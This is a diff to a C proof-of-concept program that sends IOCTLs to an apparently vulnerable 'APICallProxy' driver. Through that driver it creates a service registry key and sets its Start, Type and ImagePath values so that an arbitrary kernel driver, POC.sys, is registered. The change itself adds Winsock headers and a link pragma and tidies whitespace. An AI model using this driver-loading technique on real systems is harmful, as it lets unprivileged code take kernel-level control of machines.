@@ -1,5 +1,13 @@
 #include <stdio.h>
-#include <Windows.h>
+//#include <Windows.h>
+
+#include <winsock2.h>
+#include <Ws2tcpip.h>
+
+// Link with ws2_32.lib
+#pragma comment(lib, "Ws2_32.lib")
+
+
 
 #include "../APICallProxy/IOCTLCodes.h"
 #include "../APICallProxy/CommonStruct.h"
@@ -42,8 +50,6 @@ int main(int argc, WCHAR* argv[])
 		return 0;
 	}
 
-	
-
 	wcscpy(Reginfo.RegistryKeyPath, RegPath);
 	Reginfo.DesiredAccess = KEY_ALL_ACCESS;
 	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CREATE_REGISTRY_KEY, &Reginfo, sizeof(OpenCreateRegistryInfo), &POCKeyHandle, sizeof(HANDLE), &returned, FALSE);
@@ -68,7 +74,7 @@ int main(int argc, WCHAR* argv[])
 	}
 
 	printf("[+] Setting Start Value to SERVICE_DEMAND_START Successfully\n");
-	
+
 	memset(&SetValueInfo, 0x00, sizeof(RegistrySetValueInfo));
 	DWORD TypeValue[] = { SERVICE_KERNEL_DRIVER };
 	wcscpy(SetValueInfo.KeyName, L"Type");
@@ -106,7 +112,7 @@ int main(int argc, WCHAR* argv[])
 	WCHAR BinPath[] = L"POC.sys";	//Change to image Full Path (\??\\c:\\Users\\UserName\\Desktop\\POC.sys)
 	wcscpy(SetValueInfo.KeyName, L"ImagePath");
 	SetValueInfo.Date = BinPath;
-	SetValueInfo.DateSize =  wcslen(BinPath) * 2 + 2;
+	SetValueInfo.DateSize = wcslen(BinPath) * 2 + 2;
 	SetValueInfo.KeyHandle = POCKeyHandle;
 	SetValueInfo.Type = REG_SZ;
 
@@ -118,7 +124,7 @@ int main(int argc, WCHAR* argv[])
 
 	printf("[+] Setting ImagePath Value Successfully\n");
 
-	
+
 	// Get Needed Memory Size
 	RegistryQueryKeyValueInfo QueryKeyValueInfo = { 0 };
 	QueryKeyValueInfo.KeyHandle = POCKeyHandle;
